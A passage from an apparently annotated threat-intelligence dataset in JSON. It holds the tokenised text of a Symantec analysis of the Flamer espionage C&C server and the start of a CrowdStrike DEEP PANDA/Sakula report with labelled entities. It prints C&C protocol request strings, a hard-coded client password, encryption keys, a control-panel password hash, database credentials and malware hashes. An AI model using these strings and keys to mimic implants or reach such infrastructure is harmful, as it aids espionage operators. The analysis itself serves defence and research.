"php.", "It", "deciphers", "the", "protocol", "then"], ["logs", ",", "decodes", ",", "and", "processes", "requests", ".", "Four", "protocols", "have", "been", "identified", ",", "of", "which", "three", "are", "in", "use", ".", "The", "Red"], ["protocol", "has", "not", "been", "implemented", "yet", "."], ["The", "existence", "of", "three", "supported", "protocols", ",", "along", "with", "one", "protocol", "under", "development", ",", "confirms", "the", "C&C"], ["server\u2019s", "requirement", "to", "communicate", "with", "multiple", "evolutions", "(variants)", "of", "W32", ".", "Flamer", "or", "additional", "cyberespionage", "malware", "families", "currently", "unknown", "to", "the", "public", "."], ["Page", "9"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["These", "protocols", "are", "identified", "in", "the", "table", "below:"], ["Table", "8"], ["Protocol", "Identifier"], ["Protocol"], ["Request"], ["PROTOCOL_OLD*"], ["HTTPS"], ["UNIQUE_NUMBER=[DIGITS]&PASSWORD=LifeStyle2"], ["PROTOCOL_SIGNUP"], ["HTTPS"], ["uid=[DIGITS]&action=[DIGITS]"], ["PROTOCOL_OLD_E**"], ["HTTP"], ["NOT(uid=[DIGITS]&action=[DIGITS])"], ["PROTOCOL_RED"], ["N/A"], ["N/A"], ["*Used", "by", "W32", ".", "Flamer"], ["**PROTOCOL_OLD", "with", "custom", "encryption", "over", "HTTP"], ["Specific", "requests", "handled", "by", "the", "application", "are:"], ["Table", "9"], ["Request"], ["Functionality"], ["GetNewsHandler"], ["Responsible", "for", "sending", "news", "to", "compromised", "clients"], ["AddEntryHandler"], ["Responsible", "for", "storing", "entries", "(stolen", "data)", "from", "compromised", "clients"], ["GetAdHandler"], ["Responsible", "for", "sending", "ads", "to", "compromised", "clients"], ["The", "possibility", "that", "multiple", "Trojans", ",", "or", "at", "least", "evolutions", "of", "W32", ".", "Flamer,", "are", "at", "work", "here", "is", "backed", "up", "by", "the"], ["fact", "that", "four", "different", "IDs", "are", "used", "internally", "to", "identify", "them:"], ["Table", "10"], ["Client"], ["Internal", "ID"], ["Protocol"], ["Threat"], ["CLIENT_TYPE_SP"], ["1"], ["PROTOCOL_OLD"], ["Unknown"], ["CLIENT_TYPE_SPE"], ["2"], ["PROTOCOL_OLD_E"], ["Unknown"], ["CLIENT_TYPE_FL"], ["3"], ["PROTOCOL_OLD"], ["W32", ".", "Flamer"], ["CLIENT_TYPE_IP"], ["6"], ["PROTOCOL_SIGNUP"], ["Unknown"], ["N/A"], ["N/A"], ["PROTOCOL_RED"], ["Unknown"], ["Page", "10"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Here", "is", "a", "snippet", "of", "code", "that", "identified", "connecting", "clients:"], ["It", "is", "likely", "here", "that", "CLIENT_TYPE_SP", ",", "CLIENT_TYPE_SPE", ",", "and", "CLIENT_TYPE_FL", "implemented", "by", "D***", "are", "evolutions"], ["of", "the", "same", "threat", ".", "However", ",", "CLIENT_TYPE_IP", "which", "is", "implemented", "by", "H*****", "appears", "to", "come", "after", "the", "in-use"], ["Flamer", "protocol", ",", "which", "suggests", "that", "either", "new", "variants", "exist", "that", "we", "are", "unaware", "of", ",", "or", "there", "is", "a", "separate", "Trojan"], ["at", "work", ".", "They", "also", "included", "an", "unrecognized", "fallback", "for", "clients", "."], ["Stolen", "Data"], ["Compromised", "clients", "upload", "stolen", "data", "to", "the", "entries", "directory", ".", "Files", "stored", "in", "this", "directory", "are", "encrypted", "with", "a"], ["public", "key", "stored", "in", "the", "database", ".", "These", "files", "cannot", "be", "decrypted", "without", "the", "corresponding", "private", "key", ".", "There", "was"], ["a", "file", "of", "157", ",", "548", "bytes", "still", "left", "on", "the", "server", "that", "the", "operators", "did", "not", "have", "the", "opportunity", "to", "download", "."], ["The", "stolen", "data", "is", "encrypted", "with", "this", "public", "key", "on", "the", "server", ",", "thus", "requiring", "the", "corresponding", "unknown", "private", "key"], ["to", "decrypt:"], ["-----BEGIN", "PUBLIC", "KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtZslxFiR9KJE05Nhh7Xk"], ["+lVVpD9F6AQnvZeknDiwL3SBjZB/dB/LLXtwiet8LUS6JYCXnaIq4NxW1PymwGFZ"], ["zuc/B3p+ZAFPt06veOHOfaMAI0KDMb+laNPINvn/jJ8TfvCaUMUuMEY4sayh0xwD"], ["MwSAazMYI8rvaaS/BqhI/6vPN6D02UIpwT1TSBVeRRoPBHuYE7A93b8vJw9sBGIp"], ["KXZ90sgP1CjdAmCbhYelelninKdeTKCGvd5YXt86grWgEVf5WXzxXi3ZK1T4w0Yt"], ["mNhUEAwS7zCdtZ+Ak8b0M83wAirASvPZiBl6qF8hqCT5pKkwgBG//kk8JicboLsM"], ["VQIDAQAB"], ["-----END", "PUBLIC", "KEY----Based", "on", "timestamps", "seen", "on", "the", "first", "server", "in", "the", "/newsforyou/bak", "directory", "we", "determined", "that", "the", "operators"], ["downloaded", "the", "stolen", "data", "on", "four", "separate", "dates", "in", "May", "."], ["Table", "11"], ["Date"], ["Stolen", "data", "files"], ["2012-05-22"], ["112"], ["2012-05-23"], ["12"], ["2012-05-24"], ["11"], ["2012-05-30"], ["43"], ["Page", "11"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["A", "total", "of", "around", "75", "MB", "of", "stolen", "data", "was", "found", "in", "the", "backups", "on", "one", "of", "the", "servers", "(server", "#1)", ".", "Although", "the"], ["timing", "data", "is", "limited", "here", ",", "the", "timestamps", "of", "these", "backups", "suggest", "that", "the", "operators", "could", "be", "in", "the", "EMEA", "region", "."], ["There", "was", "a", "four-day", "delay", "from", "the", "initial", "setup", "to", "when", "the", "operators", "began", "to", "retrieve", "stolen", "data", ".", "This", "is", "a"], ["possible", "indicator", "that", "the", "information", "about", "the", "new", "server", "had", "to", "take", "time", "to", "filter", "down", "to", "them", "."], ["Figure", "3", ".", "1"], ["Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#1"], ["In", "comparison", ",", "the", "other", "server", "(server", "#2)", "saw", "a", "massive", "5", ".", "7", "GB", "of", "stolen", "data:"], ["Figure", "3", ".", "2"], ["Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#2"], ["Page", "12"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Activity"], ["By", "examining", "the", "files", "in", "the", "bak", "directories", ",", "specifically", "the", "number", "of", "files", "contained", "within", "the", "backup", "archives"], ["created", "each", "day", ",", "it", "is", "possible", "to", "obtain", "an", "indication", "of", "the", "activity", "of", "the", "C&C", "server", ",", "which", "can", "be", "seen", "in", "the"], ["chart", "below:"], ["Figure", "4", ".", "1"], ["Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#1"], ["Figure", "4", ".", "2"], ["Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#2"], ["On", "the", "first", "server", ",", "there", "is", "a", "clear", "increase", "in", "activity", "around", "May", "20", ",", "which", "then", "drops", "off", ".", "This", "is", "to", "be", "expected", "as"], ["computers", "are", "cleared", "up", "."], ["On", "the", "second", "server", "the", "Flamer", "operation", "is", "in", "full", "flow", "and", "huge", "volumes", "of", "files", "are", "being", "created", "on", "the", "system", "."], ["Page", "13"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Payload"], ["The", "news", "directory", "contains", "a", "compressed", "and", "encrypted", "file", "for", "distribution", "to", "the", "compromised", "clients", "connecting"], ["to", "the", "server", ".", "This", "file", "is", "encrypted", "with", "a", "known", "symmetric", "key", "retrieved", "from", "the", "database", "."], ["Table", "12"], ["MD5"], ["Filename"], ["File", "size"], ["0xfccd97e2513089e74ba707bbf4c1b0e5"], ["59c5452fb2ba21091513ccdc1e0ec7fd"], ["204", ",", "024", "bytes"], ["This", "is", "the", "browse32", ".", "ocx", "Flamer", "module", ",", "the", "sole", "purpose", "of", "which", "is", "to", "remove", "all", "known", "traces", "of", "the", "Flamer"], ["malware", "from", "the", "compromised", "client", "."], ["The", "payload", "is", "encrypted", "with", "this", "symmetric", "key:"], ["R&^T&IOHIO%^&^E%@#$UIO*()"], ["The", "control", "panel"], ["Access", "to", "the", "Flamer", "control", "panel", "requires", "authentication:"], ["Figure", "5"], ["Control", "panel", "login", "page"], ["The", "following", "credentials", "are", "used", "to", "gain", "access", "to", "the", "control", "panel", "(only", "the", "MD5", "password", "hash", "is", "available;"], ["attempts", "to", "crack", "the", "password", "were", "unsuccessful):"], ["Username:", "username"], ["Password", "Hash:", "27934e96d90d06818674b98bec7230fa"], ["The", "control", "panel", "for", "interacting", "with", "Flamer-compromised", "computers", "is", "very", "basic", ".", "The", "simple", "interface", "allows", "the"], ["operators", "to", "upload", "packages", "and", "download", "encrypted", "data", "stolen", "from", "the", "compromised", "clients", ".", "The", "operator", "is"], ["required", "to", "upload", "specially", "crafted", "tar", ".", "gz", "files", ".", "The", "archived", "filename", "needs", "to", "follow", "a", "specific", "format", ",", "which", "is"], ["parsed", "and", "then", "stored", "in", "the", "ads", "or", "news", "directory", ",", "depending", "on", "the", "file", "extension", "used", "."], ["The", "filename", "format", "for", "these", "packages", "is", "as", "follows:"], ["[USER", "_", "TYPE]", "_", "[USER", "_", "ID]", "_", "[PRIORITY]", "_", "[TEMP", "_", "FLAG][OPTIONAL", "_", "AND", "_", "IGNORED]", ".", "news"], ["[USER", "_", "TYPE]", "_", "[USER", "_", "ID]", "_", "[EXPIRY", "_", "TIME]", "_", "[AD", "_", "NAME]", ".", "ad"], ["Page", "14"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["The", "following", "is", "a", "screen", "shot", "of", "the", "control", "panel", "that", "allows", "the", "operator", "to", "upload", "data", "to", "the", "server:"], ["Figure", "6"], ["Control", "panel", "data", "upload", "screen"], ["This", "approach", "to", "uploading", "packages", "and", "downloading", "data", "fits", "the", "profile", "of", "military", "and", "intelligence", "operations", "."], ["A", "typical", "control", "panel", "is", "easy", "to", "use", "and", "self-explanatory", ".", "The", "operator", "has", "full", "control", "over", "what", "to", "do", "with", "the"], ["compromised", "clients", "and", "has", "the", "ability", "to", "retrieve", "and", "inspect", "the", "stolen", "information", ".", "The", "Flamer", "control", "panel"], ["provides", "limited", "capabilities", "to", "the", "operator", ",", "preventing", "them", "from", "viewing", "and", "interpreting", "the", "information", "being"], ["exchanged", "."], ["This", "approach", "would", "help", "prevent", "operators", "from", "knowing", "what", "is", "contained", "within", "the", "packages", "or", "the", "significance"], ["of", "the", "data", "being", "exchanged", "between", "clients", "and", "the", "attackers", ".", "Such", "a", "design", "would", "also", "serve", "as", "a", "defensive"], ["measure", "as", "it", "would", "prevent", "arbitrary", "packages", "from", "being", "uploaded", "and", "prevent", "downloaded", "data", "being", "from", "being"], ["inspected", "by", "unknown", "parties", "that", "may", "have", "gained", "access", "to", "the", "control", "panel", "."], ["The", "following", "screen", "on", "the", "control", "panel", "allows", "the", "user", "to", "view", "and", "download", "backed", "up", "data", "from", "the", "server:"], ["Figure", "7"], ["Control", "panel", "screen", "for", "downloading", "stolen", "data"], ["Page", "15"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "tar", ".", "gz", "contains", "all", "the", "relevant", "stolen", "data", "and", "details", "of", "where", "the", "information", "was", "stolen", "from", ".", "The", "private", "key"], ["is", "required", "here", "to", "inspect", "the", "encrypted", "data", "."], ["The", "database"], ["Location:", "/var/lib/mysql"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some"], ["logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Table", "13"], ["Database"], ["User"], ["Password"], ["MySQL"], ["news_user"], ["news_pass"], ["Schema"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some"], ["logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Figure", "8"], ["Newsforyou", "application", "database", "schema"], ["Page", "16"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "session_log", ",", "log", ",", "and", "client_log", "are", "all", "encrypted", "using", "the", "keys", "stored", "in", "the", "settings", "table", "shown", "below", "and"], ["were", "successfully", "decrypted:"], ["Table", "14"], ["Variable"], ["Value"], ["is_online"], ["True"], ["cp_user"], ["username"], ["cp_hash", "8"], ["27934e96d90d06818674b98bec7230fa"], ["max_backup_size"], ["52428800"], ["version"], ["1", ".", "4.11.4.1"], ["minimum_unload_size"], ["1572864"], ["unload_flag"], ["0"], ["general_key"], ["acK3xKMoJzsa9AVvtg59+OT4RM/x5MQ3bO2p0j+5Jd0="], ["session_key"], ["13eZ+Now4Pt5ATpPv3WUv1E8UrvJReVMD0pO0MTQqoI="], ["The", "database", "is", "regularly", "emptied", "by", "the", "delete", ".", "php", "script;", "there", "is", "limited", "data", "in", "it", ".", "The", "following", "table", "gives", "a", "brief"], ["description", "of", "the", "tables", "found", "in", "the", "database:"], ["Table", "15"], ["Table"], ["Records"], ["Record", "Id", "Encryption"], ["Description"], ["settings"], ["11"], ["11"], ["N"], ["Configuration", "values", "listed", "in", "the", "table", "below"], ["session_log"], ["8"], ["1144"], ["Y"], ["Encrypted", "session", "log"], ["client_log"], ["4"], ["1071"], ["Y"], ["Encrypted", "client", "log"], ["log"], ["213"], ["21259"], ["Y"], ["Encrypted", "logs"], ["news_entries"], ["1"], ["1"], ["N"], ["Entries", "in", "newsforyou/news", "(payloads)"], ["blog_entries"], ["1"], ["189"], ["N"], ["Entries", "in", "newsforyou/entries", "(stolen", "data)"], ["ads"], ["0"], ["n/a"], ["N"], ["Ad", "files", "in", "newsforyou/ads/"], ["backup"], ["4"], ["4"], ["N"], ["Backup", "files", "in", "newsforyou/bak/"], ["The", "session_log", "table", "contains", "details", "of", "all", "connections", "to", "the", "server", "while", "client_log", "only", "contains", "connections"], ["with", "a", "recognized", "protocol", "(e", ".", "g.", "valid", "compromised", "computers)", "."], ["Examining", "the", "data", "in", "the", "table", "indicates", "that", "1071", "valid", "requests", "were", "recorded", "from", "compromised", "clients", ".", "A"], ["decrypted", "client", "log", "entry", "contains", "the", "following", "information:"], ["CLIENT", "_", "ID:[UUID]"], ["CLIENT", "_", "TYPE:3"], ["CLIENT", "_", "VERSION:0"], ["REQUEST", "_", "TYPE:0"], ["RAW", "_", "REQUEST:UNIQUE", "_", "NUMBER=[UUID]&PASSWORD=LifeStyle2&ACTION=1&FILE", "_"], ["NAME=&FILE", "_", "SIZE=0"], ["PROTOCOL:1"], ["The", "four", "encrypted", "requests", "in", "the", "database", "on", "the", "first", "server", "are", "W32", ".", "Flamer", "client", "requests", ",", "which", "use", "the", "old"], ["protocol:"], ["\u2022", "CLIENT"], ["\u2022", "PROTOCOL"], ["="], ["="], ["3"], ["1"], ["="], ["="], ["CLIENT_TYPE_FL"], ["OLD_PROTOCOL"], ["Page", "17"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "additional", "sessions", "logged", "are", "likely", "attributed", "to", "researchers", "who", "had", "discovered", "the", "whereabouts", "of", "the"], ["command-and-control", "servers", "."], ["Table", "16"], ["IP", "Address"], ["Organization"], ["Country"], ["client_log"], ["77", ".", "42.[REMOVED]"], ["LIBANTELECOM"], ["Lebanon"], ["Y"], ["37", ".", "8.", "[REMOVED]"], ["Israel", "Haifa", "Hadara", "Technologies", "Private", "Shareholding", "Company"], ["Israel"], ["Y"], ["37", ".", "75.", "[REMOVED]"], ["Orange", "Palestine", "Group", "Co", ".", "for", "Technological", "Inves"], ["Palestine"], ["Y"], ["79", ".", "212.", "[REMOVED]"], ["Deutsche", "Telekom", "AG"], ["Germany"], ["N"], ["95", ".", "211.", "[REMOVED]"], ["LeaseWeb", "B", ".", "V."], ["Netherlands"], ["N"], ["The", "session_log", "data", "contained", "three", "separate", "HTTP_HOST", "values", ",", "indicating", "multiple", "Flamer", "C&C", "server", "URLs", "were"], ["used", "to", "access", "this", "server", "."], ["Although", "only", "one", "encrypted", "file", "existed", "in", "the", "newsforyou/entries", "folder", "(the", "stolen", "data", "uploaded", "from", "the"], ["compromised", "clients)", ",", "the", "database", "reveals", "that", "189", "records", "had", "been", "created", ".", "The", "other", "188", "files", "had", "already", "been"], ["removed", "from", "the", "server", ".", "The", "entry", "left", "on", "the", "server", "had", "been", "successfully", "stolen", "from", "the", "computer", "located", "in"], ["Israel", "."], ["A", "final", "point", "to", "note", "here", "is", "in", "relation", "to", "the", "entry", "in", "the", "news_entries", "table", ".", "Only", "one", "record", "ever", "existed:", "the"], ["malicious", "payload", "to", "clean", "the", "computers", "up", ",", "uploaded", "on", "May", "18", ",", "2012", ",", "at", "13", ".", "43:45.", "This", "server", "only", "served", "up", "one"], ["package", "and", "it", "was", "uploaded", "as", "soon", "as", "the", "server", "had", "been", "initially", "configured", ".", "The", "last", "time", "a", "compromised", "client"], ["connected", "to", "the", "server", "was", "Friday", ",", "June", "1", ",", "2012", ",", "at", "11:42:47", ",", "and", "the", "last", "log", "recorded", "in", "the", "database", "was", "Friday", ","], ["June", "1", ",", "2012", ",", "at", "11:46:01", "."], ["Conclusion"], ["Examining", "the", "W32", ".", "Flamer", "servers", "has", "provided", "additional", "insight", "into", "the", "architecture", "of", "not", "only", "the", "threat", ",", "but"], ["also", "into", "the", "command", "structure", "of", "the", "entities", "behind", "it", ".", "The", "server", "code", "was", "written", "and", "updated", "by", "at", "least", "four"], ["separate", "individuals", ",", "indicating", "a", "continuing", "development", "effort", "to", "support", "W32", ".", "Flamer", "and", ",", "potentially", ",", "new", "or"], ["additional", "threats", "of", "a", "similar", "nature", ".", "The", "command-and-control", "Web", "application", "has", "been", "in", "active", "development", "for"], ["many", "years", ",", "possibly", "as", "early", "as", "2006", ",", "which", "is", "well", "before", "Flamer\u2019s", "earliest", "seen", "compilation", "date", "in", "2010", "."], ["The", "operators", "of", "the", "C&C", "servers", "may", "be", "a", "group", "of", "less", "senior", "individuals", ",", "working", "on", "a", "need-to-know", "basis", ",", "as", "the"], ["operator", "is", "not", "required", "(nor", "has", "the", "permission)", "to", "interpret", "the", "value", "or", "purpose", "of", "the", "incoming", "data", ".", "Only", "the"], ["attackers", "have", "the", "permission", "to", "access", "and", "interpret", "this", "data", ".", "This", "separation", "of", "operational", "and", "attacker", "visibility"], ["and", "roles", "indicates", "that", "this", "is", "the", "work", "of", "a", "highly", "organized", "and", "sophisticated", "group", ".", "The", "likelihood", "of", "a", "large", "and"], ["well-funded", "entity\u2019s", "involvement", "in", "Flamer", "is", "corroborated", "by", "the", "use", "of", "the", "unique", "certificate", "weakness", "used", "to"], ["hijack", "the", "Windows", "Update", "feature", "to", "spread", "across", "networks", "."], ["They", "were", "also", "careful", "to", "unload", "and", "archive", "data", "where", "necessary", ",", "remove", "duplicate", "files", ",", "and", "delete", "unnecessary"], ["files", "to", "prevent", "the", "server", "from", "running", "out", "of", "disk", "space", ".", "This", "was", "an", "ongoing", "development", "up", "to", "2011", ".", "R***\u2019s", "edits"], ["in", "the", "source", "code", "suggest", "the", "concern", "was", "less", "about", "updating", "protocols", "and", "more", "about", "ensuring", "there", "was", "ample"], ["room", "on", "the", "servers", "for", "the", "stolen", "data", "to", "be", "uploaded", "to", ",", "begging", "the", "question", "of", "how", "much", "data", "was", "actually", "being"], ["stolen", "."], ["This", "investigation", "simply", "provides", "a", "snapshot", "in", "time", "of", "the", "Flamer", "attack", "campaign", ".", "Considering", "that", "logging", "was"], ["disabled", "and", "data", "was", "wiped", "clean", "in", "such", "a", "thorough", "manner", ",", "the", "remaining", "clues", "make", "it", "virtually", "impossible", "to"], ["determine", "the", "entity", "behind", "the", "campaign", ".", "There", "is", "little", "doubt", "that", "the", "larger", "project", "involving", "cyber-espionage"], ["tools", ",", "such", "as", "Flamer", ",", "will", "continue", "to", "evolve", "and", "retrieve", "information", "from", "the", "designated", "targets", "."], ["Page", "18"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Resources"], ["Flamer:", "Highly", "Sophisticated", "and", "Discreet", "Threat", "Targets", "the", "Middle", "East"], ["http://symantec", ".", "com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east"], ["Painting", "a", "Picture", "of", "W32", ".", "Flamer"], ["http://symantec", ".", "com/connect/blogs/painting-picture-w32flamer"], ["Flamer:", "A", "Recipe", "for", "Bluetoothache"], ["http://symantec", ".", "com/connect/blogs/flamer-recipe-bluetoothache"], ["W32", ".", "Flamer:", "Spreading", "Mechanism", "Tricks", "and", "Exploits"], ["http://symantec", ".", "com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits"], ["W32", ".", "Flamer:", "Leveraging", "Microsoft", "Digital", "Certificates"], ["http://symantec", ".", "com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates"], ["W32", ".", "Flamer:", "Microsoft", "Windows", "Update", "Man-in-the-Middle"], ["http://symantec", ".", "com/connect/blogs/w32flamer-microsoft-windows-update-man-middle"], ["W32", ".", "Flamer:", "Enormous", "Data", "Collection"], ["http://symantec", ".", "com/connect/blogs/w32flamer-enormous-data-collection"], ["Flamer:", "Urgent", "Suicide"], ["http://symantec", ".", "com/connect/blogs/flamer-urgent-suicide"], ["Page", "19"], ["Security", "Response"], ["Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec"], ["Corporation", "."], ["NO", "WARRANTY", "", ".", "The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", ".", "Any", "use", "of", "the"], ["technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", ".", "Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical"], ["errors", ".", "Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["About", "Symantec"], ["Symantec", "is", "a", "global", "leader", "in"], ["providing", "security", ",", "storage", "and"], ["systems", "management", "solutions", "to"], ["help", "businesses", "and", "consumers"], ["secure", "and", "manage", "their", "information", "."], ["Headquartered", "in", "Mountain", "View", ",", "Calif", ".", ","], ["Symantec", "has", "operations", "in", "more"], ["than", "40", "countries", ".", "More", "information"], ["is", "available", "at", "www", ".", "symantec.com."], ["For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", ".", "For", "product"], ["information", "in", "the", "U", ".", "S.,", "call"], ["toll-free", "1", "(800)", "745", "6054", "."], ["Symantec", "Corporation"], ["World", "Headquarters"], ["350", "Ellis", "Street"], ["Mountain", "View", ",", "CA", "94043", "USA"], ["+1", "(650)", "527-8000"], ["www", ".", "symantec.com"], ["Copyright", "\u00a9", "2012", "Symantec", "Corporation", ".", "All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered"], ["trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the"], ["U", ".", "S.", "and", "other", "countries", ".", "Other", "names", "may", "be", "trademarks", "of"], ["their", "respective", "owners", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "CrowdStrike Intelligence", "sent_id": 6, "pos": [7, 8]}, {"old_id": "T2", "type": "ExploitTargetObject", "name": "US Defense Industrial Base", "sent_id": 7, "pos": []}, {"old_id": "T3", "type": "Malware", "name": "Sakula", "sent_id": 8, "pos": [11]}, {"old_id": "T4", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 10, "pos": [7, 8]}, {"old_id": "T5", "type": "Malware", "name": "Sakula", "sent_id": 16, "pos": [1]}, {"old_id": "T6", "type": "Malware", "name": "PlugX", "sent_id": 17, "pos": [5]}, {"old_id": "T7", "type": "File", "name": "MediaSoftexe", "sent_id": 17, "pos": []}, {"old_id": "T8", "type": "MD5", "name": "d00b3169f45e74bb22a1cd684341b14a", "sent_id": 18, "pos": []}, {"old_id": "T9", "type": "MD5", "name": "ae6f33f6cdc25dc4bda24b2bccff79fe", "sent_id": 19, "pos": []}, {"old_id": "T10", "type": "File", "name": "msidll", "sent_id": 18, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "Sakula", "sent_id": 19, "pos": [12]}, {"old_id": "T12", "type": "MD5", "name": "0c2674c3a97c53082187d930efb645c2", "sent_id": 20, "pos": []}, {"old_id": "T13", "type": "Organization", "name": "DTOPTOOLZ Co Ltd", "sent_id": 21, "pos": [6, 10]}, {"old_id": "T14", "type": "Address", "name": "180210206246", "sent_id": 23, "pos": []}, {"old_id": "T15", "type": "Time", "name": "April 2014", "sent_id": 24, "pos": [10, 11]}, {"old_id": "T16", "type": "Time", "name": "August 2014", "sent_id": 25, "pos": [30, 31]}, {"old_id": "T17", "type": "Software", "name": "Adobe Reader", "sent_id": 28, "pos": [7, 8]}, {"old_id": "T18", "type": "Software", "name": "Juniper VPN", "sent_id": 28, "pos": [10, 11]}, {"old_id": "T19", "type": "Software", "name": "Microsoft ActiveX Control", "sent_id": 28, "pos": []}, {"old_id": "T20", "type": "Software", "name": "Microsoft ActiveX", "sent_id": 41, "pos": [10, 11]}, {"old_id": "T21", "type": "Malware", "name": "Sakula", "sent_id": 42, "pos": [1]}, {"old_id": "T22", "type": "Malware", "name": "Sakula", "sent_id": 42, "pos": [1]}, {"old_id": "T23", "type": "Indicator", "name": "www[]xha-mster[]com", "sent_id": 44, "pos": []}, {"old_id": "T24", "type": "Time", "name": "midSeptember", "sent_id": 44, "pos": [14]}, {"old_id": "T25", "type": "Email", "name": "wendellom@yahoocom", "sent_id": 44, "pos": []}, {"old_id": "T26", "type": "Attacker", "name": "tonyy starke", "sent_id": 45, "pos": []}, {"old_id": "T27", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 46, "pos": [10, 11]}, {"old_id": "T28", "type": "Address", "name": "19820045112", "sent_id": 48, "pos": []}, {"old_id": "T29", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 48, "pos": [12, 13]}, {"old_id": "T30", "type": "Time", "name": "September 2014", "sent_id": 50, "pos": [1, 2]}, {"old_id": "T31", "type": "Indicator", "name": "vpn[]foundationssl[]com", "sent_id": 52, "pos": []}, {"old_id": "T32", "type": "Organization", "name": "CrowdStrike", "sent_id": 53, "pos": [2]}, {"old_id": "T33", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 53, "pos": [9, 10]}, {"old_id": "T34", "type": "Indicator", "name": "foundationssl[]com", "sent_id": 57, "pos": []}, {"old_id": "T35", "type": "Indicator", "name": "news[]foundationssl[]com", "sent_id": 60, "pos": []}, {"old_id": "T36", "type": "Indicator", "name": "foundationssl[]com", "sent_id": 61, "pos": []}, {"old_id": "T37", "type": "Campaign", "name": "DEEP PANDA", "sent_id": 61, "pos": []}], "labels": [{"old_id": "R1", "r": "P2", "h": 3, "t": 2, "evidence": []}, {"old_id": "R2", "r": "P21", "h": 9, "t": 4, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 6, "t": 4, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 7, "t": 4, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 8, "t": 4, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 11, "t": 10, "evidence": []}, {"old_id": "R7", "r": "P33", "h": 10, "t": 14, "evidence": [19, 20, 21, 22, 23, 24]}, {"old_id": "R8", "r": "P33", "h": 10, "t": 15, "evidence": [19, 20, 21, 22, 23, 24, 25]}, {"old_id": "R9", "r": "P28", "h": 10, "t": 13, "evidence": [19, 20, 21, 22, 23]}, {"old_id": "R10", "r": "P21", "h": 22, "t": 21, "evidence": []}, {"old_id": "R11", "r": "P33", "h": 21, "t": 23, "evidence": [42, 43, 44]}, {"old_id": "R12", "r": "P21", "h": 24, "t": 21, "evidence": []}, {"old_id": "R13", "r": "P2", "h": 25, "t": 21, "evidence": []}], "title": ["inputs/txt/201411CrowdStrikeDeepPanda"], "sents": [["", "."], ["I", "am", "Ironman:", "DEEP", "PANDA", "Uses", "Sakula", "Malware"], ["to", "Target", "Organizations", "in", "Multiple", "Sectors"], ["THE", "ADVERSARY", "LINE-UP"], ["24", "NOV", "2014"], ["MATT", "DAHL"], ["Over", "the", "last", "few", "months", ",", "the", "CrowdStrike", "Intelligence", "team", "has", "been", "tracking", "a", "campaign", "of"], ["highly", "targeted", "events", "focused", "on", "entities", "in", "the", "U", ".", "S.", "Defense", "Industrial", "Base", "(DIB)", ",", "healthcare", ","], ["government", ",", "and", "technology", "sectors", ".", "This", "campaign", "infected", "victims", "with", "Sakula", "malware"], ["variants", "that", "were", "signed", "with", "stolen", "certi\ufb01cates", ".", "Investigation", "into", "this", "activity", "led", "to", "associations"], ["with", "the", "adversary", "known", "to", "CrowdStrike", "as", "DEEP", "PANDA", "."], ["On", "31", "July", "2014", ",", "an", "executable", "was", "identi\ufb01ed", ",", "which", ",", "at", "the", "time", ",", "was", "not", "detected", "by", "any", "antivirus", "products", ".", "When", "this", "\ufb01le", "was", "executed", ",", "it", "caused", "the", "victim", "to", "view", "a", "website", "by", "using", "the"], ["ShellExecute()", "API", "to", "open", "a", "URL", ".", "The", "site\u2019s", "domain", "name", "was", "meant", "to", 